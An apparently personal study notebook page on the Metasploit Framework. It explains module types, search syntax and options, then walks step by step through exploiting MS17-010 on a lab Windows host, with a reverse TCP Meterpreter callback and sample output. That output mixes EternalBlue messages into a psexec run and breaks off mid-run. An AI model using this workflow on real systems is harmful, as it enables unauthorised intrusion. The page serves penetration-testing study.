<!DOCTYPE HTML>
<html lang="en" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>metasploit - notebook</title>


        <!-- Custom HTML head -->
        <link rel="icon" href="theme/logo.png">
        

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon-de23e50b.svg">
        <link rel="shortcut icon" href="../favicon-8114d1fc.png">
        <link rel="stylesheet" href="../css/variables-8adf115d.css">
        <link rel="stylesheet" href="../css/general-2459343d.css">
        <link rel="stylesheet" href="../css/chrome-9dfbd86b.css">
        <link rel="stylesheet" href="../css/print-9e4910d8.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../fonts/fonts-9644e21d.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" id="mdbook-highlight-css" href="../highlight-493f70e1.css">
        <link rel="stylesheet" id="mdbook-tomorrow-night-css" href="../tomorrow-night-4c0ae647.css">
        <link rel="stylesheet" id="mdbook-ayu-highlight-css" href="../ayu-highlight-3fdfc3ac.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="../theme/custom-e80eafda.css">


        <!-- Provide site root and default themes to javascript -->
        <script>
            const path_to_root = "../";
            const default_light_theme = "light";
            const default_dark_theme = "navy";
            window.path_to_searchindex_js = "../searchindex-fbad826e.js";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc-f5648287.js"></script>
    </head>
    <body>
    <div id="mdbook-help-container">
        <div id="mdbook-help-popup">
            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
            <div>
                <p>Press <kbd>‚Üê</kbd> or <kbd>‚Üí</kbd> to navigate between chapters</p>
                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
                <p>Press <kbd>?</kbd> to show this help</p>
                <p>Press <kbd>Esc</kbd> to hide this help</p>
            </div>
        </div>
    </div>
    <div id="mdbook-body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                let theme = localStorage.getItem('mdbook-theme');
                let sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
            let theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="mdbook-sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            let sidebar = null;
            const sidebar_toggle = document.getElementById("mdbook-sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
                sidebar_toggle.checked = false;
            }
            if (sidebar === 'visible') {
                sidebar_toggle.checked = true;
            } else {
                html.classList.remove('sidebar-visible');
            }
        </script>

        <nav id="mdbook-sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="mdbook-sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="mdbook-page-wrapper" class="page-wrapper">

            <div class="page">
                <a href="https://rnemeth90.github.io" class="back-to-blog">
                    üè† Back to Blog
                </a>
                
                <div id="mdbook-menu-bar-hover-placeholder"></div>
                <div id="mdbook-menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="mdbook-sidebar-toggle" class="icon-button" for="mdbook-sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="mdbook-sidebar">
                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M0 96C0 78.3 14.3 64 32 64H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32C14.3 128 0 113.7 0 96zM0 256c0-17.7 14.3-32 32-32H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32c-17.7 0-32-14.3-32-32zM448 416c0 17.7-14.3 32-32 32H32c-17.7 0-32-14.3-32-32s14.3-32 32-32H416c17.7 0 32 14.3 32 32z"/></svg></span>
                        </label>
                        <button id="mdbook-theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="mdbook-theme-list">
                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M371.3 367.1c27.3-3.9 51.9-19.4 67.2-42.9L600.2 74.1c12.6-19.5 9.4-45.3-7.6-61.2S549.7-4.4 531.1 9.6L294.4 187.2c-24 18-38.2 46.1-38.4 76.1L371.3 367.1zm-19.6 25.4l-116-104.4C175.9 290.3 128 339.6 128 400c0 3.9 .2 7.8 .6 11.6c1.8 17.5-10.2 36.4-27.8 36.4H96c-17.7 0-32 14.3-32 32s14.3 32 32 32H240c61.9 0 112-50.1 112-112c0-2.5-.1-5-.2-7.5z"/></svg></span>
                        </button>
                        <ul id="mdbook-theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-default_theme">Auto</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-ayu">Ayu</button></li>
                        </ul>
                        <button id="mdbook-search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="mdbook-searchbar">
                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8 0 45.3s-32.8 12.5-45.3 0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352c79.5 0 144-64.5 144-144s-64.5-144-144-144S64 128.5 64 208s64.5 144 144 144z"/></svg></span>
                        </button>
                    </div>

                    <h1 class="menu-title">notebook</h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <span class=fa-svg id="print-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M128 0C92.7 0 64 28.7 64 64v96h64V64H354.7L384 93.3V160h64V93.3c0-17-6.7-33.3-18.7-45.3L400 18.7C388 6.7 371.7 0 354.7 0H128zM384 352v32 64H128V384 368 352H384zm64 32h32c17.7 0 32-14.3 32-32V256c0-35.3-28.7-64-64-64H64c-35.3 0-64 28.7-64 64v96c0 17.7 14.3 32 32 32H64v64c0 35.3 28.7 64 64 64H384c35.3 0 64-28.7 64-64V384zm-16-88c-13.3 0-24-10.7-24-24s10.7-24 24-24s24 10.7 24 24s-10.7 24-24 24z"/></svg></span>
                        </a>

                    </div>
                </div>

                <div id="mdbook-search-wrapper" class="hidden">
                    <form id="mdbook-searchbar-outer" class="searchbar-outer">
                        <div class="search-wrapper">
                            <input type="search" id="mdbook-searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="mdbook-searchresults-outer" aria-describedby="searchresults-header">
                            <div class="spinner-wrapper">
                                <span class=fa-svg id="fa-spin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M304 48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zm0 416c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM48 304c26.5 0 48-21.5 48-48s-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48zm464-48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM142.9 437c18.7-18.7 18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zm0-294.2c18.7-18.7 18.7-49.1 0-67.9S93.7 56.2 75 75s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zM369.1 437c18.7 18.7 49.1 18.7 67.9 0s18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9z"/></svg></span>
                            </div>
                        </div>
                    </form>
                    <div id="mdbook-searchresults-outer" class="searchresults-outer hidden">
                        <div id="mdbook-searchresults-header" class="searchresults-header"></div>
                        <ul id="mdbook-searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('mdbook-sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('mdbook-sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#mdbook-sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="mdbook-content" class="content">
                    <main>
                        <h1 id="metasploit-framework"><a class="header" href="#metasploit-framework">Metasploit Framework</a></h1>
<p>Metasploit is a penetration testing framework that provides a collection of tools for developing and executing exploit code against remote targets. The framework consists of prepared scripts with specific purposes and corresponding functions that have been developed and tested in the wild.</p>
<h2 id="important-note-on-exploit-failures"><a class="header" href="#important-note-on-exploit-failures">Important Note on Exploit Failures</a></h2>
<p>Many people often think that the failure of an exploit disproves the existence of the suspected vulnerability. However, this is only proof that the Metasploit exploit does not work and <strong>not</strong> that the vulnerability does not exist. This is because many exploits require customization according to the target hosts to make the exploit work. Therefore, automated tools such as the Metasploit framework should only be considered a support tool and not a substitute for manual skills.</p>
<hr>
<h2 id="module-structure"><a class="header" href="#module-structure">Module Structure</a></h2>
<p>Each Metasploit module follows a structured naming convention:</p>
<pre><code>&lt;No.&gt; &lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;
</code></pre>
<h3 id="example"><a class="header" href="#example">Example</a></h3>
<pre><code>794   exploit/windows/ftp/scriptftp_list
</code></pre>
<h3 id="components-explained"><a class="header" href="#components-explained">Components Explained</a></h3>
<ol>
<li><strong>Index No. (No.)</strong>: Displayed during searches to select specific modules later</li>
<li><strong>Type</strong>: First level of segregation between modules (see Module Types below)</li>
<li><strong>OS</strong>: Operating system and architecture the module targets</li>
<li><strong>Service</strong>: Vulnerable service running on target (or general activity for auxiliary/post modules)</li>
<li><strong>Name</strong>: Actual action that can be performed using the module</li>
</ol>
<hr>
<h2 id="module-types"><a class="header" href="#module-types">Module Types</a></h2>
<h3 id="interactable-modules-can-use-use-no"><a class="header" href="#interactable-modules-can-use-use-no">Interactable Modules (Can use <code>use &lt;no.&gt;</code>)</a></h3>
<p>These modules can be directly used with the <code>use</code> command:</p>
<h4 id="auxiliary"><a class="header" href="#auxiliary">Auxiliary</a></h4>
<ul>
<li><strong>Purpose</strong>: Scanning, fuzzing, sniffing, and admin capabilities</li>
<li><strong>Description</strong>: Offer extra assistance and functionality</li>
<li><strong>Example</strong>: <code>auxiliary/scanner/smb/smb_ms17_010</code> - SMB vulnerability scanner</li>
</ul>
<h4 id="exploits"><a class="header" href="#exploits">Exploits</a></h4>
<ul>
<li><strong>Purpose</strong>: Exploit vulnerabilities to allow payload delivery</li>
<li><strong>Description</strong>: Defined as modules that exploit a vulnerability</li>
<li><strong>Example</strong>: <code>exploit/windows/smb/ms17_010_psexec</code> - MS17-010 EternalRomance exploit</li>
</ul>
<h4 id="post"><a class="header" href="#post">Post</a></h4>
<ul>
<li><strong>Purpose</strong>: Information gathering, pivoting deeper into networks</li>
<li><strong>Description</strong>: Wide array of modules for post-exploitation activities</li>
<li><strong>Example</strong>: <code>post/windows/gather/credentials</code> - Gather Windows credentials</li>
</ul>
<h3 id="non-interactable-modules-support-modules"><a class="header" href="#non-interactable-modules-support-modules">Non-Interactable Modules (Support modules)</a></h3>
<p>These modules support the interactable ones but cannot be directly used:</p>
<h4 id="encoders"><a class="header" href="#encoders">Encoders</a></h4>
<ul>
<li><strong>Purpose</strong>: Ensure payloads are intact to their destination</li>
<li><strong>Description</strong>: Encode payloads to evade detection and filters</li>
</ul>
<h4 id="nops-no-operation-code"><a class="header" href="#nops-no-operation-code">NOPs (No Operation code)</a></h4>
<ul>
<li><strong>Purpose</strong>: Keep payload sizes consistent across exploit attempts</li>
<li><strong>Description</strong>: Used to maintain consistent buffer sizes</li>
</ul>
<h4 id="payloads"><a class="header" href="#payloads">Payloads</a></h4>
<ul>
<li><strong>Purpose</strong>: Code that runs remotely and calls back to attacker machine</li>
<li><strong>Description</strong>: Establishes connection (or shell) back to attacker</li>
<li><strong>Example</strong>: <code>windows/meterpreter/reverse_tcp</code> - Reverse TCP Meterpreter payload</li>
</ul>
<h4 id="plugins"><a class="header" href="#plugins">Plugins</a></h4>
<ul>
<li><strong>Purpose</strong>: Additional scripts integrated within msfconsole</li>
<li><strong>Description</strong>: Extend functionality and coexist with other modules</li>
</ul>
<hr>
<h2 id="searching-for-modules"><a class="header" href="#searching-for-modules">Searching for Modules</a></h2>
<p>Metasploit offers a well-developed search function to quickly find suitable modules for targets.</p>
<h3 id="basic-search-syntax"><a class="header" href="#basic-search-syntax">Basic Search Syntax</a></h3>
<pre><code class="language-bash">search [&lt;options&gt;] [&lt;keywords&gt;:&lt;value&gt;]
</code></pre>
<h3 id="search-options"><a class="header" href="#search-options">Search Options</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-h</code></td><td>Show help information</td></tr>
<tr><td><code>-o &lt;file&gt;</code></td><td>Send output to a file in CSV format</td></tr>
<tr><td><code>-S &lt;string&gt;</code></td><td>Regex pattern used to filter search results</td></tr>
<tr><td><code>-u</code></td><td>Use module if there is one result</td></tr>
<tr><td><code>-s &lt;search_column&gt;</code></td><td>Sort results based on column in ascending order</td></tr>
<tr><td><code>-r</code></td><td>Reverse the search results order to descending order</td></tr>
</tbody>
</table>
</div>
<h3 id="search-keywords"><a class="header" href="#search-keywords">Search Keywords</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Keyword</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>aka</code></td><td>Modules with matching AKA (also-known-as) name</td></tr>
<tr><td><code>author</code></td><td>Modules written by this author</td></tr>
<tr><td><code>arch</code></td><td>Modules affecting this architecture</td></tr>
<tr><td><code>bid</code></td><td>Modules with matching Bugtraq ID</td></tr>
<tr><td><code>cve</code></td><td>Modules with matching CVE ID</td></tr>
<tr><td><code>edb</code></td><td>Modules with matching Exploit-DB ID</td></tr>
<tr><td><code>check</code></td><td>Modules that support the ‚Äòcheck‚Äô method</td></tr>
<tr><td><code>date</code></td><td>Modules with matching disclosure date</td></tr>
<tr><td><code>description</code></td><td>Modules with matching description</td></tr>
<tr><td><code>fullname</code></td><td>Modules with matching full name</td></tr>
<tr><td><code>mod_time</code></td><td>Modules with matching modification date</td></tr>
<tr><td><code>name</code></td><td>Modules with matching descriptive name</td></tr>
<tr><td><code>path</code></td><td>Modules with matching path</td></tr>
<tr><td><code>platform</code></td><td>Modules affecting this platform</td></tr>
<tr><td><code>port</code></td><td>Modules with matching port</td></tr>
<tr><td><code>rank</code></td><td>Modules with matching rank (descriptive like ‚Äògood‚Äô or numeric with operators like ‚Äògte400‚Äô)</td></tr>
<tr><td><code>ref</code></td><td>Modules with matching ref</td></tr>
<tr><td><code>reference</code></td><td>Modules with matching reference</td></tr>
<tr><td><code>target</code></td><td>Modules affecting this target</td></tr>
<tr><td><code>type</code></td><td>Modules of specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)</td></tr>
</tbody>
</table>
</div>
<h3 id="supported-search-columns-for-sorting"><a class="header" href="#supported-search-columns-for-sorting">Supported Search Columns (for sorting)</a></h3>
<ul>
<li><code>rank</code> - Sort by exploitability rank</li>
<li><code>date</code> / <code>disclosure_date</code> - Sort by disclosure date</li>
<li><code>name</code> - Sort by module name</li>
<li><code>type</code> - Sort by module type</li>
<li><code>check</code> - Sort by whether they have a check method</li>
</ul>
<h3 id="search-examples"><a class="header" href="#search-examples">Search Examples</a></h3>
<h4 id="simple-search"><a class="header" href="#simple-search">Simple Search</a></h4>
<pre><code class="language-bash">msf6 &gt; search eternalromance
</code></pre>
<h4 id="filtered-search"><a class="header" href="#filtered-search">Filtered Search</a></h4>
<pre><code class="language-bash">msf6 &gt; search eternalromance type:exploit
</code></pre>
<h4 id="complex-search"><a class="header" href="#complex-search">Complex Search</a></h4>
<pre><code class="language-bash">msf6 &gt; search type:exploit platform:windows cve:2021 rank:excellent microsoft
</code></pre>
<p>This searches for:</p>
<ul>
<li>Exploit modules</li>
<li>Targeting Windows platform</li>
<li>Related to CVEs from 2021</li>
<li>With excellent rank</li>
<li>Containing ‚Äúmicrosoft‚Äù in the name/description</li>
</ul>
<h4 id="excluding-results"><a class="header" href="#excluding-results">Excluding Results</a></h4>
<p>Prepend a value with <code>-</code> to exclude matching results:</p>
<pre><code class="language-bash">msf6 &gt; search cve:2009 type:exploit platform:-linux
</code></pre>
<hr>
<h2 id="module-selection-and-usage"><a class="header" href="#module-selection-and-usage">Module Selection and Usage</a></h2>
<h3 id="step-1-finding-a-module"><a class="header" href="#step-1-finding-a-module">Step 1: Finding a Module</a></h3>
<p>First, identify your target and search for appropriate modules. For example, if you‚Äôve identified SMB port 445 open on a Windows target:</p>
<pre><code class="language-bash">msf6 &gt; search ms17_010
</code></pre>
<p>Output:</p>
<pre><code>Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
</code></pre>
<h3 id="step-2-selecting-a-module"><a class="header" href="#step-2-selecting-a-module">Step 2: Selecting a Module</a></h3>
<p>Use the module number or full path:</p>
<pre><code class="language-bash">msf6 &gt; use 1
# OR
msf6 &gt; use exploit/windows/smb/ms17_010_psexec
</code></pre>
<p>The prompt changes to indicate the active module:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt;
</code></pre>
<h3 id="step-3-viewing-module-options"><a class="header" href="#step-3-viewing-module-options">Step 3: Viewing Module Options</a></h3>
<p>Check what options need to be configured:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options
</code></pre>
<p>Output shows:</p>
<ul>
<li><strong>Required</strong> options (must be set)</li>
<li><strong>Optional</strong> options (can be customized)</li>
<li>Current settings</li>
<li>Descriptions for each option</li>
</ul>
<h3 id="step-4-configuring-options"><a class="header" href="#step-4-configuring-options">Step 4: Configuring Options</a></h3>
<p>Set required options for your target:</p>
<pre><code class="language-bash"># Set target host
msf6 exploit(windows/smb/ms17_010_psexec) &gt; set RHOSTS 10.10.10.40

# Set global options (persist across modules)
msf6 exploit(windows/smb/ms17_010_psexec) &gt; setg LHOST 10.10.14.15

# Set local options (only for current module)
msf6 exploit(windows/smb/ms17_010_psexec) &gt; set LPORT 4444
</code></pre>
<h3 id="step-5-checking-vulnerability-optional"><a class="header" href="#step-5-checking-vulnerability-optional">Step 5: Checking Vulnerability (Optional)</a></h3>
<p>If the module supports it, check if target is vulnerable before exploiting:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; check
</code></pre>
<h3 id="step-6-viewing-payloads"><a class="header" href="#step-6-viewing-payloads">Step 6: Viewing Payloads</a></h3>
<p>See available payloads for the selected exploit:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show payloads
</code></pre>
<h3 id="step-7-setting-payload-optional"><a class="header" href="#step-7-setting-payload-optional">Step 7: Setting Payload (Optional)</a></h3>
<p>If you want a specific payload instead of the default:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; set payload windows/meterpreter/reverse_tcp
</code></pre>
<p>Then configure payload-specific options:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options
</code></pre>
<h3 id="step-8-executing-the-exploit"><a class="header" href="#step-8-executing-the-exploit">Step 8: Executing the Exploit</a></h3>
<p>Run the exploit:</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; run
# OR
msf6 exploit(windows/smb/ms17_010_psexec) &gt; exploit
</code></pre>
<hr>
<h2 id="common-module-options"><a class="header" href="#common-module-options">Common Module Options</a></h2>
<h3 id="target-options"><a class="header" href="#target-options">Target Options</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>RHOSTS</code></td><td>Target host(s) - can be single IP, CIDR, or file</td><td><code>set RHOSTS 10.10.10.40</code></td></tr>
<tr><td><code>RHOST</code></td><td>Single target host</td><td><code>set RHOST 10.10.10.40</code></td></tr>
<tr><td><code>RPORT</code></td><td>Target port (TCP)</td><td><code>set RPORT 445</code></td></tr>
</tbody>
</table>
</div>
<h3 id="payload-options"><a class="header" href="#payload-options">Payload Options</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>LHOST</code></td><td>Attacker‚Äôs IP address (for reverse shells)</td><td><code>setg LHOST 10.10.14.15</code></td></tr>
<tr><td><code>LPORT</code></td><td>Attacker‚Äôs listening port</td><td><code>set LPORT 4444</code></td></tr>
<tr><td><code>PAYLOAD</code></td><td>Payload to use</td><td><code>set payload windows/meterpreter/reverse_tcp</code></td></tr>
<tr><td><code>TARGET</code></td><td>Target OS/architecture</td><td><code>set TARGET 0</code></td></tr>
</tbody>
</table>
</div>
<h3 id="other-common-options"><a class="header" href="#other-common-options">Other Common Options</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>SMBUser</code></td><td>Username for SMB authentication</td></tr>
<tr><td><code>SMBPass</code></td><td>Password for SMB authentication</td></tr>
<tr><td><code>SMBDomain</code></td><td>Windows domain for authentication</td></tr>
<tr><td><code>SHARE</code></td><td>SMB share name (e.g., ADMIN$, C$)</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="useful-commands"><a class="header" href="#useful-commands">Useful Commands</a></h2>
<h3 id="help-commands"><a class="header" href="#help-commands">Help Commands</a></h3>
<pre><code class="language-bash">help                    # General help menu
help search             # Search command help
help &lt;command&gt;          # Help for specific command
</code></pre>
<h3 id="information-commands"><a class="header" href="#information-commands">Information Commands</a></h3>
<pre><code class="language-bash">info &lt;module&gt;           # Detailed module information
show options            # Show module options
show payloads           # Show available payloads
show targets            # Show available targets
show advanced           # Show advanced options
</code></pre>
<h3 id="configuration-commands"><a class="header" href="#configuration-commands">Configuration Commands</a></h3>
<pre><code class="language-bash">set &lt;option&gt; &lt;value&gt;    # Set option for current module
setg &lt;option&gt; &lt;value&gt;   # Set global option (persists)
unset &lt;option&gt;          # Unset option
unsetg &lt;option&gt;         # Unset global option
</code></pre>
<h3 id="session-management"><a class="header" href="#session-management">Session Management</a></h3>
<pre><code class="language-bash">sessions                # List active sessions
sessions -i &lt;id&gt;        # Interact with session
sessions -k &lt;id&gt;        # Kill session
background              # Background current session
</code></pre>
<h3 id="module-commands"><a class="header" href="#module-commands">Module Commands</a></h3>
<pre><code class="language-bash">use &lt;module&gt;            # Select module
back                    # Go back to previous context
check                   # Check if target is vulnerable
run / exploit           # Execute exploit
</code></pre>
<hr>
<h2 id="exploit-rank-levels"><a class="header" href="#exploit-rank-levels">Exploit Rank Levels</a></h2>
<p>Metasploit ranks exploits based on reliability:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Rank</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><strong>excellent</strong></td><td>Exploit will never crash the service</td></tr>
<tr><td><strong>great</strong></td><td>Exploit has a default target and auto-detects the target</td></tr>
<tr><td><strong>good</strong></td><td>Exploit has a default target</td></tr>
<tr><td><strong>normal</strong></td><td>Exploit is otherwise reliable</td></tr>
<tr><td><strong>average</strong></td><td>Exploit is generally unreliable</td></tr>
<tr><td><strong>low</strong></td><td>Exploit is nearly impossible to exploit</td></tr>
<tr><td><strong>manual</strong></td><td>Exploit is unstable or difficult to exploit</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="complete-example-workflow"><a class="header" href="#complete-example-workflow">Complete Example Workflow</a></h2>
<h3 id="scenario"><a class="header" href="#scenario">Scenario</a></h3>
<p>Target: Windows 7 machine with SMB port 445 open, potentially vulnerable to MS17-010</p>
<h3 id="step-by-step-execution"><a class="header" href="#step-by-step-execution">Step-by-Step Execution</a></h3>
<pre><code class="language-bash"># 1. Start msfconsole
msfconsole

# 2. Search for relevant exploit
msf6 &gt; search ms17_010

# 3. Select the exploit module
msf6 &gt; use exploit/windows/smb/ms17_010_psexec

# 4. View module options
msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options

# 5. Set target
msf6 exploit(windows/smb/ms17_010_psexec) &gt; set RHOSTS 10.10.10.40

# 6. Set attacker IP (global, persists)
msf6 exploit(windows/smb/ms17_010_psexec) &gt; setg LHOST 10.10.14.15

# 7. Set listening port
msf6 exploit(windows/smb/ms17_010_psexec) &gt; set LPORT 4444

# 8. Verify configuration
msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options

# 9. Check vulnerability (optional)
msf6 exploit(windows/smb/ms17_010_psexec) &gt; check

# 10. Execute exploit
msf6 exploit(windows/smb/ms17_010_psexec) &gt; run
</code></pre>
<h3 id="expected-output-successful-exploit"><a class="header" href="#expected-output-successful-exploit">Expected Output (Successful Exploit)</a></h3>
<pre><code>[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
